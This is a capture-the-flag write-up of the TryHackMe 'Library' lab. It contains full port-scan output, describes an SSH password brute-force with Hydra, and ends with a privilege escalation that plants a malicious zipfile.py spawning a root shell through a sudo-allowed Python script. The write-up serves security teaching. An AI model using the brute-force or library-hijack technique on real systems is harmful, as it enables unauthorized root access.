-------------------

### CTF-: TRYHACKME
### Lab-: Library

-------------------

![image](https://github.com/user-attachments/assets/46a2c6c6-e25d-4e2e-ae07-32033853d713)

------------------

### Enumeration

- Rustscan's output
      
      ❯ rustscan -a 10.10.162.244 -- -Pn -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      Nmap? More like slowmap.🐢
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.162.244:22
      Open 10.10.162.244:80
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 16:52 WAT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 16:52
      Completed NSE at 16:52, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 16:52
      Completed NSE at 16:52, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 16:52
      Completed NSE at 16:52, 0.00s elapsed
      Initiating Parallel DNS resolution of 1 host. at 16:52
      Completed Parallel DNS resolution of 1 host. at 16:52, 0.07s elapsed
      DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
      Initiating Connect Scan at 16:52
      Scanning 10.10.162.244 [2 ports]
      Discovered open port 80/tcp on 10.10.162.244
      Discovered open port 22/tcp on 10.10.162.244
      Completed Connect Scan at 16:52, 0.19s elapsed (2 total ports)
      Initiating Service scan at 16:52
      Scanning 2 services on 10.10.162.244
      Completed Service scan at 16:52, 6.47s elapsed (2 services on 1 host)
      NSE: Script scanning 10.10.162.244.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 16:52
      Completed NSE at 16:52, 6.94s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 16:52
      Completed NSE at 16:52, 0.84s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 16:52
      Completed NSE at 16:52, 0.01s elapsed
      Nmap scan report for 10.10.162.244
      Host is up, received user-set (0.19s latency).
      Scanned at 2024-11-01 16:52:24 WAT for 15s
      
      PORT   STATE SERVICE REASON  VERSION
      22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/X/Zd2/Rc7PrxR+K9bGX9i7Imk3JlU274UsMqM6X03THehc6XUvg0URMryl9IldYLjQvD0fadIg1jB8rCxqzRiJi35nw7ICUXnpZryDS/guLb94Sb9IrLWBTNNdUWV7bTb4gMaGHdyQAmKY62FgL2aKUFMn8SpxJu0WiVIQgcKkv15s17rNqVD39kG8x/bfdftcjn/YtEP09Sy4z1FqXF9FT1xWKaVr3Pd5rCAU4rpOzVpS+qTj77NWaXNDlcg3aCRaILD+4lquq8kVAA+VcXR9IwXOTKJRzRCMfYwd3M6QC45LlRa17xvhI++vBtCcGwxuD9JZsXu0Cd/5fdisrl
      |   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI8Oi4FyiWylek0a1n1TD1/TBOi2uXVPfqoSo1C56D1rJlv4g2g6SDJjW29bhodoVO6W8VdWNQGiyJ5QW2XirHI=
      |   256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOPQQrT4KT/PF+8i33LGgs0c83MQL1m863niSGsBDfCN
      80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
      | http-methods: 
      |_  Supported Methods: POST OPTIONS GET HEAD
      |_http-server-header: Apache/2.4.18 (Ubuntu)
      | http-robots.txt: 1 disallowed entry

- I checked the `robots.txt` file and got an hint of using `rcokyou` to bruteforce.

![image](https://github.com/user-attachments/assets/7c81ddbb-d02a-434c-8e35-e8105f711884)

- I checked the index page and discovered a possible user `meliodas`.

![image](https://github.com/user-attachments/assets/4cc86528-8f25-48c7-88be-dcc70f983247)

- Then, I tried to brutforce the `ssh` service with `Hydra` which worked.

![image](https://github.com/user-attachments/assets/b80f143c-98b5-48af-a839-89d862ef5490)

- Ssh access as user `Meliodas`

![image](https://github.com/user-attachments/assets/9c73b421-e4a0-4659-b1ad-02089052ef5a)

-----------------------

### Privesc with Python Library

- I ran `sudo -l` and discovered that user `meliodas` can execute a python script as root which is present in his directory.

![image](https://github.com/user-attachments/assets/31e424da-f001-40bd-9015-b2ad244e9771)

- I checked the source code and noticed that the script imports 2 modules `os` and `zipfile`.We don't need to read the code further,we've gotten a sink.Python checks the current directory for
a module before it checks `/usr/lib` directory for python scripts.We can abuse one of the modules by creating a malicious script in the current working directory.A module `zipfile` will have
script `zipfile.py`.

```python3
#!/usr/bin/env python
import os
import zipfile
```

- I created a `zipfile.py` in the directory and added this piece of code below.

```python3
import os
os.setuid(0);os.setgid(0);os.system("bash -p")
```

- I ran the `sudoers rule ` command again to gain root

![image](https://github.com/user-attachments/assets/4e4ccf64-b176-480f-a8a1-13e12c19ad31)

- Root!!!!

![image](https://github.com/user-attachments/assets/fecb5dd6-0a69-42a0-bdf8-30a03f88500f)

---------------

### THANKS FOR READING!!!

---------------









